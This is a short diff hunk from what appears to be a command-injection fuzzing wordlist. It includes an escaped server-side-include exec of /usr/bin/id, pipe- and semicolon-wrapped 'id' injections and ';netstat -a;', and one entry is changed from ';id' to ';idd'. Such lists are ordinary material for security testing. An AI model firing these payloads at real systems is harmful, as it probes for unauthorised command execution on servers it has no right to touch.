@@ -4,7 +4,7 @@
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 /index.html|id|
 ;id;
-;id
+;idd
 ;netstat -a;
 ;id;
 |id
